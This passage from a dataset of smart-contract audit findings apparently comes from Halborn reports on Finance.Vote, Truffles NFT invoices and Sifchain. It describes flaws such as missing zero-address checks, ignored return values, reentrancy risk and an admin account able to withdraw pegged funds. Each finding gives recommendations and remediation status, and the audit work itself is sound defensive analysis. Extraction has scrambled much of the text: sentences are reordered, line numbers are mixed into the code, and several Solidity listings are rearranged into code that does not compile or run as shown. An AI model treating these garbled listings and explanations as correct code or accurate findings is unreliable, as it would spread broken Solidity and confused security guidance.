acknowledged this issue. 33 ",
        "labels": [
            "Halborn",
            "MatterLabs_zkSync_Era_Circuits_Zero_Knowledge",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING ADDRESS VALIDATION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The GatedMerkleIdentity.sol and Incinerator.sol contracts lack a safety check inside their constructors and functions. Setters of address type Otherwise, contract parameters should include a zero-address check. functionality may become inaccessible, or tokens could be burnt forever. Code Location: GatedMerkleIdentity.sol Line #~45 Listing 1: GatedMerkleIdentity.sol (Lines ) 45 46 47 48 49 function setGateParameters ( address _incinerator , address _burnToken , uint _ethCost ) public managementOnly { incinerator = IIncinerator ( _incinerator ); burnToken = _burnToken ; ethCost = _ethCost ; } GatedMerkleIdentity.sol Line #~52 Listing 2: GatedMerkleIdentity.sol (Lines ) // change the management key function setManagement ( address newMgmt ) external managementOnly { address oldMgmt = management = newMgmt ; emit ManagementUpdated ( oldMgmt , newMgmt ); management ; } 52 53 54 55 56 57 58 Incinerator.sol Line #~36 13 Listing 3: Incinerator.sol (Lines ) 36 37 38 39 40 function setManagement ( address newMgmt ) external managementOnly { address oldMgmt = management = newMgmt ; emit ManagementUpdated ( oldMgmt , newMgmt ); management ; } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Add proper address validation when assigning a value to a variable from user-supplied data. Better yet, address white-listing/black-listing should be implemented in relevant functions if possible. For example: Listing 4: Modifier.sol (Lines 2,3,4) 1 2 3 4 5 modifier validAddress ( address addr ) { require ( addr != address (0) , \" Address cannot be 0 x0 \"); require ( addr != address ( this ) , \" Address cannot be contract \" ); _; } Remediation Plan: RISK ACCEPTED: Finance.Vote Team decided to continue without address validation. 14 ",
        "labels": [
            "Halborn",
            "Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING EVENT HANDLER",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In the GatedMerkleIdentity.sol contract, some functions do not emit logging events. Events are a method of informing the transaction initiator about the actions taken by the called function. Logs are used for event subscriptions and are indexed. It is not possible to search for a specific event unless the contract logs it. Code Location: GatedMerkleIdentity.sol Line #~45 Listing 5: GatedMerkleIdentity.sol (Lines ) 45 46 47 48 function setGateParameters ( address _incinerator , address _burnToken , uint _ethCost ) public managementOnly { burnToken = _burnToken ; ethCost = _ethCost ; } Risk Level: Likelihood - 2 Impact - 2 Recommendation: Where appropriate, declare events at the end of the function. Clients can use events to detect the end of the operation and aid in searching for the specific activity. For example: 15 Listing 6: GatedMerkleIdentity.sol (Lines ) 1 2 3 4 5 function setGateParameters ( address _incinerator , address _burnToken , uint _ethCost ) public managementOnly { burnToken = _burnToken ; ethCost = _ethCost ; emit SetGateEvent ( burnToken , ethCost ); } Remediation Plan: RISK ACCEPTED: Finance.Vote Team decided to continue without event emitting. 16 ",
        "labels": [
            "Halborn",
            "Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract",
            "Severity: Low"
        ]
    },
    {
        "title": "IGNORED RETURN VALUES",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The return value of an external call is not stored in a local or state variable. In the contract Incinerator.sol, there are a few instances where external methods are called and the return value (bool) is ignored. Code Location: GatedMerkleIdentity.sol Line #~63 Listing 7: GatedMerkleIdentity.sol (Lines 69) function withdraw ( uint merkleIndex , bytes32 [] memory proof ) external payable { require ( msg . value >= ethCost , ' Please send more ETH '); require ( verifyEntitled ( merkleRoots [ merkleIndex ], msg . sender , proof ) , \" The proof could not be verified . \" ); // burn token cost if ( msg . value > 0) { incinerator . incinerate { value : msg . value }( burnToken ); } // note that this effectively prevents inclusion of the same address in multiple merkle roots require (! withdrawn [ msg . sender ], \" You have already withdrawn your nft . \"); withdrawn [ msg . sender ] = true ; token . createIdentityFor ( msg . sender ); } 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 Incinerator.sol Line #~43 17 Listing 8: Incinerator.sol (Lines ) // buy tokens at market rate and burn them function incinerate ( address tokenAddr ) external payable { uint amountOutMin = 0; address [] memory path = new address [](2) ; path [0] = WETH ; path [1] = tokenAddr ; address burnAddress = address (0) ; uint deadline = block . timestamp + 1; uint [] memory amounts = router . swapExactETHForTokens { value : msg . value }( amountOutMin , path , burnAddress , deadline ) ; emit TokensIncinerated ( tokenAddr , amounts [1]) ; } 43 44 45 46 47 48 49 50 51 52 53 54 55 Risk Level: Likelihood - 1 Impact - 3 Recommendation: Add a return value check to avoid an unexpected crash of the contract. Return value checks provide better exception handling. Remediation Plan: RISK ACCEPTED: Finance.Vote Team decided to continue without checking return values. 18 ",
        "labels": [
            "Halborn",
            "Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract",
            "Severity: Low"
        ]
    },
    {
        "title": "MULTIPLE INCINERATE ON THE WITHDRAW PROGRESS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In the GatedMerkleIdentity.sol contract, a user can only withdraw However, repeated when providing the correct merkleIndex and proof. incinerate calls can occur if the user attempts multiple withdrawals because incinerate is called before checking for a previous withdraw. Code Location: GatedMerkleIdentity.sol Line #~63 Listing 9: GatedMerkleIdentity.sol (Lines 69) 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 function withdraw ( uint merkleIndex , bytes32 [] memory proof ) external payable { require ( msg . value >= ethCost , ' Please send more ETH '); require ( verifyEntitled ( merkleRoots [ merkleIndex ], msg . sender , proof ) , \" The proof could not be verified . \" ); // burn token cost if ( msg . value > 0) { incinerator . incinerate { value : msg . value }( burnToken ); } // note that this effectively prevents inclusion of the same address in multiple merkle roots require (! withdrawn [ msg . sender ], \" You have already withdrawn your nft . \"); withdrawn [ msg . sender ] = true ; token . createIdentityFor ( msg . sender ); } 19 Risk Level: Likelihood - 1 Impact - 1 Recommendation: The workflow should be checked according to the incinerator progress. As an solution, require(! withdrawn[msg.sender] line should move to the top of the function. Listing 10: GatedMerkleIdentity.sol (Lines 69) 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 function withdraw ( uint merkleIndex , bytes32 [] memory proof ) external payable { require ( msg . value >= ethCost , ' Please send more ETH '); require ( verifyEntitled ( merkleRoots [ merkleIndex ], msg . sender , proof ) , \" The proof could not be verified . \" ); require (! withdrawn [ msg . sender ], \" You have already withdrawn your nft . \"); // burn token cost if ( msg . value > 0) { incinerator . incinerate { value : msg . value }( burnToken ); } // note that this effectively prevents inclusion of the same address in multiple merkle roots withdrawn [ msg . sender ] = true ; token . createIdentityFor ( msg . sender ); } Remediation Plan: SOLVED: Finance.Vote Team changed the location of modifier. 20 Listing 11: GatedMerkleIdentity.sol (Lines 67) 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 function withdraw ( uint merkleIndex , bytes32 [] memory proof ) external payable { require ( msg . value >= ethCost , ' Please send more ETH '); require ( verifyEntitled ( merkleRoots [ merkleIndex ], msg . sender , proof ) , \" The proof could not be verified . \" ); // note that this effectively prevents inclusion of the same address in multiple merkle roots require (! withdrawn [ msg . sender ], \" You have already withdrawn your nft . \"); withdrawn [ msg . sender ] = true ; // burn token cost if ( msg . value > 0) { incinerator . incinerate { value : msg . value }( burnToken ); } token . createIdentityFor ( msg . sender ); } 21 ",
        "labels": [
            "Halborn",
            "Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract",
            "Severity: Informational"
        ]
    },
    {
        "title": "MISSING ARRAY ELEMENT CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "The verifyProof function in the GatedMerkleIdentity.sol contract discards the first bytes32 element in the user-provided proof array. Code Location: GatedMerkleIdentity.sol Line #~45 Listing 12: GatedMerkleIdentity.sol (Lines 99) 96 function verifyProof ( bytes32 root , bytes32 leaf , bytes32 [] 97 98 99 100 101 102 103 104 memory proof ) public pure returns ( bool ) { bytes32 currentHash = leaf ; for ( uint i = 1; i < proof . length ; i += 1) { currentHash = parentHash ( currentHash , proof [ i ]) ; } return currentHash == root ; } Example Inputs Listing 13 1 function withdraw ( uint merkleIndex , bytes32 [] memory proof ) 2 merkleIndex : 3 - 0 xd778161eb220a7790fc703d428fb65c50de8c9fa37ea6a5cd8ae6d1513ee7a3f 3 proof : [ \"0 x0000000000000000000000000000000000000000000000000000000000000000 \" ,\"0 x0d015084d5b21f5040c727e73691438a3d401c651c8c4f5d0f6dc480f57ece5c \" ] 22 Risk Level: Likelihood - 1 Impact - 1 Recommendation: It is recommended to check the proof arrays first element. However, if this is the intended behavior of the function, the first element should not be considered in the proof calculation. Remediation Plan: SOLVED: Finance.Vote Team checked proof arrays first element. Listing 14: GatedMerkleIdentity.sol (Lines 99) 96 function verifyProof ( bytes32 root , bytes32 leaf , bytes32 [] memory proof ) public pure returns ( bool ) { bytes32 currentHash = leaf ; for ( uint i = 0; i < proof . length ; i += 1) { currentHash = parentHash ( currentHash , proof [ i ]) ; } return currentHash == root ; } 97 98 99 100 101 102 103 104 105 23 ",
        "labels": [
            "Halborn",
            "Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract",
            "Severity: Informational"
        ]
    },
    {
        "title": "FOR LOOP OVER DYNAMIC ARRAY",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "When smart contracts are deployed or functions inside them are called, the execution of these actions always requires a certain amount of gas, based on how much computation is needed to complete them. The Ethereum network specifies a block gas limit and the sum of all transactions included in a block cannot exceed the threshold. Programming patterns that are harmless in centralized applications can lead to Denial of Service conditions in smart contracts when the cost of executing a function exceeds the block gas limit. Modifying an array of unknown size, that increases in size over time, can lead to such a Denial of Service condition. A situation in which the block gas limit can be an issue is in sending funds to an array of addresses. Even without any malicious intent, this can easily go wrong. Just by having too large an array of users to pay can max out the gas limit and prevent the transaction from ever succeeding. Example Location: Listing 15: GatedMerkleIdentity.sol (Lines 99) 96 function verifyProof ( bytes32 root , bytes32 leaf , bytes32 [] 97 98 99 100 101 102 103 104 memory proof ) public pure returns ( bool ) { bytes32 currentHash = leaf ; for ( uint i = 1; i < proof . length ; i += 1) { currentHash = parentHash ( currentHash , proof [ i ]) ; } return currentHash == root ; } 24 Risk Level: Likelihood - 1 Impact - 1 Recommendation: Actions that require looping across the entire data structure should be avoided. If you absolutely must loop over an array of unknown size, then you should plan for it to potentially take multiple blocks, and therefore require multiple transactions. As an other solution, the function should be marked as an internal. Remediation Plan: RISK ACCEPTED: Finance.Vote Team decided to continue without checking proof array size. 25 ",
        "labels": [
            "Halborn",
            "Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract",
            "Severity: Informational"
        ]
    },
    {
        "title": "POSSIBLE MISUSE OF PUBLIC FUNCTIONS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract_Security_Audit_Halborn_v1_1.pdf",
        "body": "In public functions, array arguments are immediately copied to memory, while external functions can read directly from calldata. Reading Public functions need to calldata is cheaper than memory allocation. write the arguments to memory because public functions may be called internally. Internal calls are passed internally by pointers to memory. Thus, the function expects its arguments being located in memory when the compiler generates the code for an internal function. Code Location: Listing 16: GatedMerkleIdentity.sol (Lines ) 96 function verifyProof ( bytes32 root , bytes32 leaf , bytes32 [] 97 98 99 100 101 102 103 104 memory proof ) public pure returns ( bool ) { bytes32 currentHash = leaf ; for ( uint i = 1; i < proof . length ; i += 1) { currentHash = parentHash ( currentHash , proof [ i ]) ; } return currentHash == root ; } Risk Level: Likelihood - 1 Impact - 1 26 Recommendation: Consider declaring external variables instead of public variables. A best practice is to use external if expecting a function to only be called externally and public if called internally. Public functions are always accessible, but external functions are only available to external callers. Remediation Plan: SOLVED: Finance.Vote Team provided the function is called internally and externally. 27 MANUAL TESTING 28 During the manual testing multiple questions where considered while evaluation each of the defined functions:  Can it be re-called changing admin/roles and permissions?  Can an externally controlled contract recursively call functions during execution? (Re-entrancy)  Do we control sensitive or vulnerable parameters?  Does the function check for boundaries on the parameters and internal values? Bigger than zero or equal? Argument count, array sizes, integer truncation.  Are there any hash collisions in the merkle proof calculation?  Can an attacker withdraw multiple times? 4.1 Access Control Test During First, all contracts access-control policies were evaluated. the tests, the following functions were reachable only by the management address. Listing 17 1 function setGateParameters ( address _incinerator , address _burnToken , uint _ethCost ) 2 function setManagement ( address newMgmt ) 3 function addMerkleRoot ( bytes32 newRoot ) According to policies, No issues have been found on the dynamic analysis. Figure 1 29 G N I T S E T L A U N A M Figure 1: Testing Access Control Policy 4.2 Merkle Tree Test Next, the Merkle Proof functionality was examined. In the merkle proof verification, Msg.sender was used for a leaf on the tree. Figure 2 It has been observed that, the proof arrays first element was not included in the hash calculation. Therefore, It is marked as an informational issue in the report. (HAL04 - MISSING ARRAY ELEMENT CHECK) Listing 18: GatedMerkleIdentity.sol (Lines 99) 96 function verifyProof ( bytes32 root , bytes32 leaf , bytes32 [] 97 98 99 100 101 102 103 104 memory proof ) public pure returns ( bool ) { bytes32 currentHash = leaf ; for ( uint i = 1; i < proof . length ; i += 1) { currentHash = parentHash ( currentHash , proof [ i ]) ; } return currentHash == root ; } 30 G N I T S E T L A U N A M Figure 2: Testing Merkle Proof 4.3 Multiple Withdraw Test The Halborn Team tried to Then the withdraw progress was tested. Figure 3 From the test results, It was manipulate withdraw progress. observed that the user could not create an identity multiple times. On the other hand, the user could incinerate multiple times due to check statements being completed after an incinerator call. G N I T S E T L A U N A M 31 Figure 3: Testing Multiple Withdraws G N I T S E T L A U N A M 32 ",
        "labels": [
            "Halborn",
            "Finance_Vote_GatedMerkleIdentity_and_Incinerator_Smart Contract",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF THE TWO STEP OWNERSHIP TRANSFER PATTERN",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Truffles_NFT_Invoice_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The Authorizable contract is inherited by the Truffles contract and implements the Ownable pattern. However, the assessment revealed that the solution does not support the two-step-ownership-transfer pattern. The ownership transfer might be accidentally set to an inactive EOA account. In the case of account hijacking, all functionalities get under permanent control of the attacker. Code Location: Listing 1: contracts/Authorizable.sol 8 contract Authorizable is Ownable { 9 10 mapping ( address => bool ) private authorized ; 11 modifier onlyAuthorized () { 12  authorized \" ); 13 14 } require ( authorized [ msg . sender ] || _ ; owner () == msg . sender , \" Not Listing 2: contracts/Truffles.sol 34 contract TRUFFLES is ERC721 , ERC721Enumerable , ERC721URIStorage ,  Authorizable { BVSS: AO:S/AC:L/AX:L/C:N/I:H/A:H/D:M/Y:M/R:N/S:C (3.0) 19 Recommendation: It is recommended to implement a two-step process where the owner nominates an account and the nominated account needs to call an acceptOwnership() function for the transfer of the ownership to fully succeed. This ensures the nominated EOA account is a valid and active account. Remediation Plan: SOLVED: The Truffles team solved this finding in commit fc36014: the Ownable contract was replaced with the Ownable2Step.sol from the Open- Zeppelin library within the Authorizable contract to establish a secure approach for conducting two-step ownership transfers. 20 ",
        "labels": [
            "Halborn",
            "Truffles_NFT_Invoice",
            "Severity: Low"
        ]
    },
    {
        "title": "MISSING ZERO ADDRESS CHECK",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Truffles_NFT_Invoice_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "do not addEligibleHolder, and functions The isEligibleHolder no addresses provided as parameters are the zero addresses. Consequently, there is a risk of accidentally setting an eligible holder address to the zero address, leading to unintended behavior or potential vulnerabilities in the future. removeEligibleHolder verification perform ensure that to Code Location: Listing 3: contracts/Truffles.sol (Lines 103,110) s_eligibleHolders [ _org ] = true ; 102 function addEligibleHolder ( address _org ) public onlyAuthorized { 103 104 } 105 106 // / @notice remove eligible holders for NFT 107 // / @dev remove eligible address to eligibleHolders maping :  onlyAuthorized 108 // / @param _org address of already eligible holder 109 function removeEligibleHolder ( address _org ) public onlyAuthorized  { 110 111 } s_eligibleHolders [ _org ] = false ; Listing 4: contracts/Truffles.sol (Line 197) public view returns ( bool _isEligibleHolder ) 192 function isEligibleHolder ( address _holder ) 193 194 195 196 { 197 198 } return ( s_eligibleHolders [ _holder ]) ; 21 BVSS: AO:S/AC:L/AX:L/C:N/I:C/A:N/D:N/Y:N/R:N/S:U (2.0) Recommendation: Consider adding a check to ensure that the provided address is not the zero address before modifying or checking holders eligibility. It is also possible to add a modifier that performs the verification and then apply it to the above functions instead, to avoid repeating the zero address check in each function. Remediation Plan: SOLVED: The Truffles team solved this finding in commit fc36014: the func- tion addEligibleHolder was updated with a validation step to ensure that the provided address is not the zero address before making modifications to the headlineholders eligibility. Similarly, the removeEligibleHolder function now includes a validation check to confirm that the given address corresponds to an existing holder. 22 ",
        "labels": [
            "Halborn",
            "Truffles_NFT_Invoice",
            "Severity: Low"
        ]
    },
    {
        "title": "INVOICE TYPE CHECK MISSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Truffles_NFT_Invoice_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The settlePrivateInvoice function allows authorized addresses to mark the corresponding NFT of a private invoice as settled when the full However, it lacks a check to verify amount of the invoice is paid. Consequently, that the provided NFT is of the private invoice type. both private and public invoices could be settled indifferently. If the provided NFT ID corresponds to a public invoice, it is added to the s_isPrivateInvoicePaid mapping, even though its type does not match, leading to data inconsistency. In addition, private invoices do not store the amount for the NFT unlike public ones, so the function also does not have a proper check to verify that the full amount of the invoice is paid. Code Location: Listing 5: contracts/Truffles.sol address to , uint256 tokenId , string memory uri 128 function mintPrivateInvoice ( 129 130 131 132 ) public onlyAuthorized { 133 134 135 136 } _safeMint ( to , tokenId ); _setTokenURI ( tokenId , uri ); s_nftType [ tokenId ] = NftType . PrivateInvoice ; Listing 6: contracts/Truffles.sol (Lines 142,143) 141 function settlePrivateInvoice ( uint256 _nftID ) public  onlyAuthorized { 142 143 require ( _exists ( _nftID ) , \" NFT not minted \" ); s_isPrivateInvoicePaid [ _nftID ] = true ; 23 144 145 } BVSS: AO:S/AC:L/AX:L/C:N/I:H/A:L/D:N/Y:M/R:N/S:U (1.9) Recommendation: It is recommended to include a check in the settlePrivateInvoice function to verify that the invoice being settled corresponds to the private NFT type. This additional check ensures that only invoices related to private NFTs can be settled within the function. Remediation Plan: SOLVED: The Truffles team solved this finding in commit fc36014: A validation step was introduced to ensure that the provided NFT ID is that of a private invoice before modifying the s_isPrivateInvoicePaid mapping. 24 ",
        "labels": [
            "Halborn",
            "Truffles_NFT_Invoice",
            "Severity: Informational"
        ]
    },
    {
        "title": "LACK OF REENTRANCYGUARD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Truffles_NFT_Invoice_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "the Truffles In and mintPrivateInvoice play a crucial role in minting public and private invoices as non-fungible tokens (NFTs). mintPublicInvoice contract, functions the To achieve this, these functions make use of the _safemint function from the ERC721 contract. This function is responsible for verifying whether the designated recipient can indeed receive ERC721 tokens. By performing this check, it ensures that an NFT is not minted to a contract incapable of handling ERC721 tokens, safeguarding the integrity of the token ecosystem. However, a potential security loophole arises due to an external function call within these functions. When the to parameter refers to a smart contract, it must implement IERC721Receiver.onERC721Received, which is invoked during a safe transfer of the NFT. This external function call creates an opportunity for reentrancy attacks. of the absence reentrancy Specifically, the a mintPublicInvoice and mintPrivateInvoice functions allows an attacker to exploit the onERC721Received callback by performing reentrant calls. This vulnerability enables the attacker to execute multiple, unintended operations during the callback, leading to unexpected and potentially harmful outcomes. guard both in In this context, the possibility of a reentry attack is considered to be unlikely, since only authorized users and the administrator have the privilege to call the mintPublicInvoice and mintPrivateInvoice functions for token minting. Furthermore, as there are no limits on the number of invoices that can be created, and no balance transfers are involved, the potential impact of any such attack would be minimal. 25 Nevertheless, it is crucial to exercise caution, as even minor changes to the code could inadvertently introduce significant security vulnera- bilities Code Location: Listing 7: contracts/Truffles.sol (Line 133) address to , uint256 tokenId , string memory uri 128 function mintPrivateInvoice ( 129 130 131 132 ) public onlyAuthorized { 133 134 135 136 } _safeMint ( to , tokenId ); _setTokenURI ( tokenId , uri ); s_nftType [ tokenId ] = NftType . PrivateInvoice ; Listing 8: contracts/Truffles.sol (Line 179) address _to , uint256 _tokenId , string memory _uri , uint256 _invoiceAmount , string calldata _currency , string calldata _invoiceID , bytes32 _merkleProofTransaction 160 function mintPublicInvoice ( 161 162 163 164 165 166 167 168 ) public onlyAuthorized { 169 170 171 172 173 174 175 176 177 178 179 invoiceData memory iData = invoiceData ({ Amount : _invoiceAmount , nftID : _tokenId , merkleProofTransaction : _merkleProofTransaction , currency : _currency , invoiceID : _invoiceID }) ; s_invoiceDetails [ _tokenId ] = iData ; s_invoice_ID_to_Nft_ID [ _invoiceID ] = _tokenId ; s_nftType [ _tokenId ] = NftType . PublicInvoice ; _safeMint ( _to , _tokenId ); 26 BVSS: AO:S/AC:L/AX:L/C:N/I:M/A:N/D:N/Y:M/R:N/S:U (1.2) Recommendation: To address this security concern to contract be resilient against reen- trancy attacks providing a robust and secure NFT minting process, it is crucial to fortify both the mintPublicInvoice and mintPrivateInvoice functions with two effective measures:  add a reentrancy guard  the adoption of the check-effects pattern. Remediation Plan: SOLVED: The Truffles team solved this finding in commit fc36014: the reentrancy guard was added to mintPrivateInvoice and mintPublicInvoice functions to mitigate the risk of reentrancy attacks. 27 ",
        "labels": [
            "Halborn",
            "Truffles_NFT_Invoice",
            "Severity: Informational"
        ]
    },
    {
        "title": "REDUNDANT CHECK IN THE REMOVEAUTHORIZED FUNCTION",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Truffles_NFT_Invoice_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "In the Authorizable contract, the addAuthorized function allows the owner to add an address to the list of authorized addresses. It requires that the provided address is not the zero address, and it can only be executed by the contract owner because of the onlyOwner modifier. The removeAuthorized function allows the owner to remove an address from the list of authorized addresses. It requires that the provided address is not the zero address and is different from the senders, which has to be the owner. The checks performed in the latter function are redundant, since the addAuthorized function already prevents adding the zero address as an authorized address. Therefore, this check is unnecessary and result in extra gas overhead. Code Location: Listing 9: contracts/Authorizable.sol (Line 25) 24 function addAuthorized ( address _toAdd ) onlyOwner public { 25 26 27 } require ( _toAdd != address (0) ) ; authorized [ _toAdd ] = true ; Listing 10: contracts/Authorizable.sol (Lines 27,28) 26 function removeAuthorized ( address _toRemove ) onlyOwner public { 27 28 29 30 } require ( _toRemove != address (0) ) ; require ( _toRemove != msg . sender ); authorized [ _toRemove ] = false ; 28 BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Consider removing the unnecessary check from the removeAuthorized func- tion. Remediation Plan: SOLVED: The Truffles team solved this finding in commit fc36014: the redundant check was removed from the removeAuthorized function. 29 ",
        "labels": [
            "Halborn",
            "Truffles_NFT_Invoice",
            "Severity: Informational"
        ]
    },
    {
        "title": "CONTRACT PAUSE FEATURE MISSING",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Truffles_NFT_Invoice_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "It was identified that the Owner cannot pause the Truffles contract. In the case of a security incident, this means that the owner lacks the ability to halt the minting or settlement of Invoices, potentially leading to further complications. Code Location:  contracts/Truffles.sol BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Consider adding the pause functionality to the contract. Remediation Plan: SOLVED: The Truffles team solved this finding in commit 2e2a367: The contract now incorporates a pausing mechanism, which introduces two ad- ditional functions: pauseContract and unpauseContract. This enhancement is complemented by the inclusion of the whenNotPaused modifier within several functions, including mintPrivateInvoice, settlePrivateInvoice, mintPublicInvoice, and _beforeTokenTransfer. 30 ",
        "labels": [
            "Halborn",
            "Truffles_NFT_Invoice",
            "Severity: Informational"
        ]
    },
    {
        "title": "FLOATING PRAGMA",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Solidity Smart Contract Audits/Truffles_NFT_Invoice_Smart_Contract_Security_Assessment_Report_Halborn_Final.pdf",
        "body": "The Truffles contract uses the Solidity pragma 0.8.9. Its essential to deploy the contract with the exact compiler version and flags that have undergone thorough testing. Locking the pragma to a specific version helps to ensure that contracts are not accidentally deployed using outdated compiler versions, which might introduce bugs negatively impacting the contract system, or excessively new pragma versions that havent undergone extensive testing. Code Location: Listing 11: contracts/Truffles.sol (Line 2) 1 // SPDX - License - Identifier : MIT 2 pragma solidity ^0.8.9; BVSS: AO:A/AC:L/AX:L/C:N/I:N/A:N/D:N/Y:N/R:N/S:U (0.0) Recommendation: Consider locking the pragma version with known bugs for the compiler When possible, do not use floating pragma in the final live version. Specifying a fixed compiler version ensures that the deployment. This is especially bytecode produced does not vary between builds. important if you rely on bytecode-level verification of the code. 31 Remediation Plan: SOLVED: The Truffles team solved this finding in commit fc36014: the pragma version has been locked and upgraded to match the version used in the Authorizable contract. Listing 12: contracts/Truffles.sol (Line 2) 1 // SPDX - License - Identifier : MIT 2 pragma solidity 0.8.17; 32 MANUAL TESTING 33 In the manual testing phase, the following scenarios were simulated. The scenarios listed below were selected based on the severity of the vulnerabilities Halborn was testing the program for. 5.1 ACCESS CONTROL ",
        "labels": [
            "Halborn",
            "Truffles_NFT_Invoice",
            "Severity: Informational"
        ]
    },
    {
        "title": "PRIVILEGED ACCOUNT CAN ACCESS PEGGED FUNDS",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf",
        "body": "The primary function of Sifchain is to offer a cross-chain decentralized exchange. This is achieved by using a decentralized group of oracles that have special privileges. The Peggy design document states that the oracles should use a consensus model. And is used for cross-chain swaps on both the Ethereum and Sif networks, however a single Admin account is capable of withdrawing tokens via the RescueCeth functionality. This is without consensus or governance, and is entirely unilateral. The risk is compounded by additional findings outlined in this report. Code Location: IsAdminAccount is the function used to authenticate the Admin. Listing 1: x/oracle/keeper/adminAccount.go 18 func ( k Keeper ) IsAdminAccount ( ctx sdk . Context , adminAccount sdk . AccAddress ) bool { account := k. GetAdminAccount ( ctx ) if account == nil { return false } return bytes . Equal ( account , adminAccount ) 19 20 21 22 23 24 } This is used as the only authority check in the ProcessRescueCeth and ProcessUpdateCethReceiverAccount function, if the following test passes, all ceth (aka wrapped ethereum assets on Sifchain) can be withdrawn to an arbitrary Sifchain account. Listing 2: x/oracle/keeper/keeper.go 215 216 if ! k . oracleKeeper . IsAdminAccount ( ctx , cosmosSender ) { logger . Error (\" cosmos sender is not admin account . \") 15 217 218 return errors . New ( \" only admin account can call rescue ceth \" ) } Risk Level: Likelihood - 3 Impact - 3 Recommendations: Short Term:  Setup monitoring for activity on the Admin account, any activity should immediately trigger a response.  Prepare a break-glass procedure for the case where this account is compromised. What needs to be done on both chains, who will do it, how to communicate the issue, community interaction. All incident response tasks need to be pre-planned. Assume that it will happen, and design the response to minimize the damage. This procedure will likely involve pausing contracts and halting the oracle nodes to prevent ongoing damage. Long Term:  Eliminate the Admin account.  Remove any privileged account functions and move these abilities as a function of governance or delegate the functionality to a super majority vote of either oracles or validators. Remediation Plan: ACKNOWLEDGED: and claims ProcessUpdateCethRecieverAccount do not have access to all the pegged ProcessRescueCeth Sifchain Team that 16 They can only access cETH paid by users funds deposited by users. as fees to export their assets to Ethereum. ProcessRescueCeth1 and ProcessUpdateCethRecieverAccount do NOT have access to all the pegged They can only access cETH paid by users funds deposited by users. as fees to export their assets to Ethereum. When users export assets from Sifchain to Ethereum, they pay cETH to a Receiver Account that The relayers are on both Ethereum and represents the Relayers. Sifchain, only they can accept cETH on Ethereum and pay a corresponding amount of ETH on Ethereum on behalf of the user to send them their and exported ProcessUpdateCethRecieverAccount is to occasionally gather all the cETH paid by users as fees, have the admin export it to Ethereum, and then give it to the Relayer so it can pay additional fees. ProcessRescueCeth Ethereum assets. purpose The of 17 ",
        "labels": [
            "Halborn",
            "Sifchain_Sifnode_042_Upgrade",
            "Severity: Medium"
        ]
    },
    {
        "title": "ADMIN ACCOUNT IS HARD",
        "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Cosmos Audits/Sifchain_Sifnode_042_Upgrade_Security_Audit_Report_Halborn_v1_1.pdf",
